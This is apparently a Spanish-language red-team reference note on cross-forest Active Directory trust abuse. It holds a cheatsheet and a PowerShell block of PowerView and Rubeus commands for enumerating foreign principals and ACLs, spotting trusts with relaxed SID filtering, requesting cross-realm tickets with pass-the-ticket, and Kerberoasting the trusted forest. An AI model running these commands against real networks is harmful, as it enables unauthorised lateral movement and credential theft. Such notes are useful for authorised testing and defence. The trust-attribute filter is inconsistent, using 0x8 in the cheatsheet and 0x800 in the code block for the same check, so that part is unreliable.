---
aliases:
  - Inter-Forest Trust Abuse
  - Cross-Forest Trust Abuse
  - Forest Trust Attack
tags:
  - technique/lateral-movement
  - technique/privilege-escalation
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[Intra-Forest Trust Abuse]]"
  - "[[Kerberoasting]]"
  - "[[AD - Domain & Forest Trusts]]"
  - "[[ACL Abuse]]"
---
# Inter-Forest Trust Abuse

Entre **bosques distintos** (forest trust / external trust), el bosque es el límite de seguridad → **SID filtering SÍ se aplica** por defecto, bloqueando el truco de ExtraSids de [[Intra-Forest Trust Abuse]]. El abuso cross-forest se basa en **acceso explícito concedido**, no en escalada automática:

- **Foreign group membership / ACLs**: usuarios de un forest agregados a grupos o con permisos en el otro.
- **Cross-realm TGS**: pedir tickets de servicio hacia el forest confiado con tu TGT (Rubeus `asktgs`).
- **Roasting cross-forest**: Kerberoast/AS-REP contra cuentas del otro forest si el trust lo permite.
- **SID filtering mal configurado** (TGTDelegation / SIDHistory habilitado) → reabre ExtraSids.

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Get-DomainTrust -Domain corp.local \| ? TrustType -eq 'Forest'` | Trusts de bosque + dirección/transitividad | Recon del trust. |
| `Get-DomainForeignGroupMember -Domain target.forest` | Usuarios *foráneos* en grupos del otro forest (acceso explícito) | Hallar el puente. |
| `Get-DomainObjectAcl -Domain target.forest \| ? SecurityIdentifier -match '<MY_FOREST_SID>'` | ACLs que tu forest tiene sobre objetos del otro | Foreign ACL abuse. |
| `Get-DomainTrust \| ? {$_.TrustAttributes -match 'TREAT_AS_EXTERNAL' -or $_.TrustAttributes -band 0x8}` | Trusts con TGTDelegation/SIDHistory habilitado (SID filtering relajado) | Reabre ExtraSids cross-forest. |
| `Rubeus.exe asktgs /service:cifs/dc.target.forest /ticket:<inter-realm-TGT>` | TGS hacia un servicio del forest confiado | Acceso cross-forest con tu TGT. |
| `Rubeus.exe kerberoast /domain:target.forest` | Hashes de cuentas con SPN del otro forest | Si el trust permite la query. |

```powershell
# 1. Enumerar el puente real: ¿qué te dieron en el otro forest?
Get-DomainForeignGroupMember -Domain target.forest
Get-DomainForeignUser -Domain target.forest
# 2. Si hay trust con SID filtering relajado (TGTDelegation), ExtraSids vuelve a funcionar
Get-DomainTrust | ? { $_.TrustAttributes -band 0x800 }   # TGT delegation enabled
# 3. Cross-realm: usar TGT propio para pedir TGS al otro forest
Rubeus.exe asktgs /service:cifs/dc.target.forest /ticket:referral.kirbi /ptt
```

---

## Overview

Cross-forest **no** hay escalada gratis: Microsoft mete **SID filtering** para que un compromiso de un forest no contamine al otro. El atacante busca el **acceso que un admin concedió a propósito** (o por error):

- Cuentas/grupos foráneos con permisos (foreign principals).
- ACLs cross-forest sobre objetos sensibles.
- Trust con `TGTDelegation` habilitado o SID filtering deshabilitado → se rompe la protección y ExtraSids vuelve.
- Servicios alcanzables vía cross-realm TGS.

> [!warning] SID filtering
> Por default, inyectar un SID privilegiado del otro forest en `ExtraSids` es **filtrado** → no escala. Solo funciona si el trust está mal configurado (quarantine off / TGTDelegation on). Verificá `TrustAttributes` antes de intentar.

> [!tip] vs Intra-Forest
> Intra-forest = escalada automática (SID filtering off) → child a root trivial. Inter-forest = solo lo que te concedieron explícitamente, salvo misconfig. Ver [[Intra-Forest Trust Abuse]].

---

## Recursos

- [The Hacker Recipes — Trusts](https://www.thehacker.recipes/ad/movement/trusts) — intra vs inter forest.
- [Harmj0y — A Guide to Attacking Domain Trusts](https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944) — referencia clásica.
- [improsec — SID filtering bypass](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-1) — cuándo se relaja.
